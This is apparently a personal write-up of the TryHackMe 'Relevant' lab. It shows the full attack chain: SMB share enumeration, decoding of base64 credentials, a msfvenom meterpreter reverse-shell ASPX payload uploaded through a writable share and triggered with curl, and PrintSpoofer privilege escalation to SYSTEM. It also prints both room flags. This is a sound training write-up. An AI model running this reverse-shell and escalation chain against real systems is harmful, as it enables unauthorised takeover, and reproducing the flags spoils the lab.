# Relevant

**Platform:** TryHackMe
**Date:** 2026-07-10
**Difficulty:** Medium
**Category:** Windows / Web / Priv Escalation
**Room URL:** https://tryhackme.com/room/relevant
**Status:** ✅ Completed

---

## 📌 What Was This Room About?
> Relevant is a boot to root penetration testing room were you have to exploit the smb port to gain access to the machine and use PrintSpoofer to escalate privileges.

---

## 🔍 Reconnaissance
> What was the first thing you did? Always start with recon.

### Nmap Scan
```bash
nmap -sV 10.10.74.199  
```

**Results:**
`Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 19:51 WIB  
`Nmap scan report for 10.10.74.199 (10.10.74.199)  
`Host is up (0.38s latency).  
`Not shown: 995 filtered tcp ports (no-response)  
`PORT STATE SERVICE VERSION  
`80/tcp open http Microsoft IIS httpd 10.0  
`135/tcp open msrpc Microsoft Windows RPC  
`139/tcp open netbios-ssn Microsoft Windows netbios-ssn  
`445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  
`3389/tcp open ms-wbt-server Microsoft Terminal Services  
`Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows`

---

## 🧭 Steps I Took

> Write each step in order. Explain WHY you did it, not just WHAT you did.

### Step 1 — 
- **What I did:** After performing the nmap scan I used this command: `smbclient -L \\10.10.74.199` to list the shares the machine had:

 Sharename       Type      Comment  
        ---------       ----      -------  
        ADMIN$          Disk      Remote Admin  
        C$              Disk      Default share  
        IPC$            IPC       Remote IPC  
        nt4wrksv        Disk        
Reconnecting with SMB1 for workgroup listing.  
do_connect: Connection to 10.10.74.199 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
Unable to connect with SMB1 -- no workgroup available

I then used this command: `smbclient \\\\10.10.74.199\\nt4wrksv` to gain access to the smb server and I found `passwords.txt`.

`cat passwords.txt   
`[User Passwords - Encoded]  
`Qm9iIC0gIVBAJCRXMHJEITEyMw==  
`QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

It appears that these are passwords to specific users. I used this command: `echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d` to decrypt the username and passwords and I got this:

`Bob - P@$$W0rD123`

&

then i used this command to decrypt the next set: 
`echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d  

`Bill - Juw4nnaM4n420696969!$$`

It took me a while to notice that Bob And Bill's credentials are just a rabbit hole set by the creator of the room.

- **Command/Tool used:**
```bash
# smbclient -L \\10.10.74.199
# smbclient \\\\10.10.74.199\\nt4wrksv
# cat passwords.txt
# echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
# echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d  
```
### Step 2 — 
- **What I did:**  Since the network share from ‘nt4wrksv’ is writeable, we can use it for a reverse shell.
`msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.34.126 lport=8910 -f aspx -o shell.aspx  
`[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  
`[-] No arch selected, selecting arch: x64 from the payload  
`No encoder specified, outputting raw payload  
`Payload size: 200774 bytes  
`Final size of aspx file: 1014987 bytes  
`Saved as: shell.aspx

Next i entered msfconsole and started a listener:
msfconsole -q  
msf6 > use exploit/multi/handler  
[*] Using configured payload generic/shell_reverse_tcp  
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp  
payload => windows/x64/meterpreter_reverse_tcp  
msf6 exploit(multi/handler) > set LHOST 10.4.34.126  
LHOST => 10.4.34.126  
msf6 exploit(multi/handler) > set LPORT 8910  
LPORT => 8910

I then put the shell on the target machine via smb:
smbclient \\\\10.10.74.199\\nt4wrksv  
Password for [WORKGROUP\kali]:  
Try "help" to get a list of possible commands.  
smb: \> put shell.aspx  
putting file shell.aspx as \shell.aspx (149.1 kb/s) (average 149.1 kb/s)

Then I invoked the reverse shell:
curl http://10.10.13.92:49663/nt4wrksv/shell.aspx

When I looked back at my listener, I was able to catch the shell:
[*] Started reverse TCP handler on 10.4.34.126:8910   
[*] Meterpreter session 2 opened (10.4.34.126:8910 -> 10.10.13.92:49692) at 2023-09-17 

I searched for the flag and i eventually found the user flag:
21:00:27 +0700meterpreter > cat C:/users/bob/desktop/user.txt  
`THM{fdk4ka34vk346ksxfr21tg789ktf45}  
meterpreter >

- **Command/Tool used:**
```bash
# `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.34.126 lport=8910 -f aspx -o shell.aspx
# msfconsole -q  
# smbclient \\\\10.10.74.199\\nt4wrksv  
# curl http://10.10.13.92:49663/nt4wrksv/shell.aspx
```

### Step 3 — 
- **What I did:** After obtaining the first flag, I attempted privilege escalation. I check my privileges using ‘getprivs.’ In meterpreter, I found ‘SeImpersonatePrivilege.’

meterpreter > getprivs

Enabled Process Privileges  
Name  
----  
SeAssignPrimaryTokenPrivilege  
SeAuditPrivilege  
SeChangeNotifyPrivilege  
SeCreateGlobalPrivilege  
SeImpersonatePrivilege  
SeIncreaseQuotaPrivilege  
SeIncreaseWorkingSetPrivilege

To perform privilege escalation using ‘SeImpersonatePrivilege,’ I used PrintSpoofer. But before I could do any of that, I had to download it:
`wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe

I entered smb to put the payload into the target system:
`smbclient \\\\10.10.13.92\\nt4wrksv  
`Password for [WORKGROUP\kali]:  
`Try "help" to get a list of possible commands.  
`smb: \> put PrintSpoofer64.exe  
`putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (17.5 kb/s) (average 17.5 kb/s)

`smb: \> dir  
 `` .                                   D        0  Sun Sep 17 21:09:03 2023  
 `` ..                                  D        0  Sun Sep 17 21:09:03 2023  
 `` passwords.txt                       A       98  Sat Jul 25 22:15:33 2020  
  `PrintSpoofer64.exe                    A     3934  Sun Sep 17 21:09:04 2023  
  `shell.aspx                          A  1014987  Sun Sep 17 20:59:47 2023                7735807 blocks of size 4096. 5138597 blocks available

Using the meterpereter shell I gained before I spawned a shell:

`meterpreter > shell  
`Process 2064 created.  
`Channel 1 created.  
`Microsoft Windows [Version 10.0.14393]  
`(c) 2016 Microsoft Corporation. All rights reserved.

`c:\windows\system32\inetsrv>cd c:/inetpub/wwwroot/nt4wrksv  
`cd c:/inetpub/wwwroot/nt4wrksvc:\inetpub\wwwroot\nt4wrksv>dir  
`dir  
`` Volume in drive C has no label.  
`` Volume Serial Number is AC3C-5CB5 Directory of c:\inetpub\wwwroot\nt4wrksv09/17/2023  07:29 AM    <DIR>          .  
`09/17/2023  07:29 AM    <DIR>          ..  
`07/25/2020  08:15 AM                98 passwords.txt  
`09/17/2023  07:29 AM            27,136 PrintSpoofer64.exe  
`09/17/2023  06:59 AM         1,014,987 shell.aspx  
``               4 File(s)      1,046,155 bytes  
  ``             2 Dir(s)  21,047,664,640 bytes free

I located my payload and used this command to execute it: PrintSpoofer64.exe -i -c powershell.exe. And when I typed whoami, I was nt authority\system, which for the non windows users reading this, just means root privilages:)

`c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe  
`PrintSpoofer64.exe -i -c powershell.exe  
`[+] Found privilege: SeImpersonatePrivilege  
`[+] Named pipe listening...  
`[+] CreateProcessAsUser() OK  
`Windows PowerShell   
`Copyright (C) 2016 Microsoft Corporation. All rights reserved.

`PS C:\Windows\system32> whoami  
`whoami  
`nt authority\system  

After spending some time jubilating I started searching for the flag, which was not too hard to find:
`PS C:\Windows\system32> cd \users\administrator\desktop      
`cd \users\administrator\desktop  
`PS C:\users\administrator\desktop> dir  
`dir  
 ``   Directory: C:\users\administrator\desktopMode                LastWriteTime         Length Name                            
----                -------------         ------ ----                            
`-a----        7/25/2020   8:25 AM             35 root.txt                      PS C:\users\administrator\desktop> cat root.txt  
`cat root.txt  
`THM{1fk5kf469devly1gl320zafgl345pv}`

- **Command/Tool used:**
```bash
# getprivs
# wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
# smbclient \\\\10.10.13.92\\nt4wrksv  
# PrintSpoofer64.exe -i -c powershell.exe  

```

---

## 🛠 Commands Used

| Command                                                                                              | What It Does                                |
| ---------------------------------------------------------------------------------------------------- | ------------------------------------------- |
| `nmap -sV 10.10.74.199`                                                                              | Scans target system                         |
| `smbclient -L \\10.10.74.199<br>`                                                                    | list shares of target system                |
| `smbclient \\\\10.10.74.199\\nt4wrksv`                                                               | Enters the smb server of target system      |
| `cat passwords.txt`                                                                                  | lists content of passwords.txt              |
| `echo Qm9iIC0gIVBAJCRXMHJEITEyMw== \| base64 -d`                                                     | decrypts base64 encryption                  |
| `echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk \| base64 -d`                                         | decrypts base64 encryption                  |
| `msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.34.126 lport=8910 -f aspx -o shell.aspx` | generates a meterpreter reverse tcp payload |
| `msfconsole -q`                                                                                      | opens msfconsole                            |
| `curl http://10.10.13.92:49663/nt4wrksv/shell.aspx`                                                  | runs payload                                |
| `getprivs`                                                                                           | gets current privileges                     |
| `wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe`               | downloads printspoofer                      |
| `PrintSpoofer64.exe -i -c powershell.exe`                                                            | runs printspoofer                           |



---

## 🚩 Flags Found

| Flag      | Value                                 |
| --------- | ------------------------------------- |
| User flag | `THM{fdk4ka34vk346ksxfr21tg789ktf45}` |
| Root flag | `THM{1fk5kf469devly1gl320zafgl345pv}` |

---

## 📎 Resources Used
> Links to tutorials, writeups, or documentation that helped you.

- [GTFOBINS](https://gtfobins.org/)

---
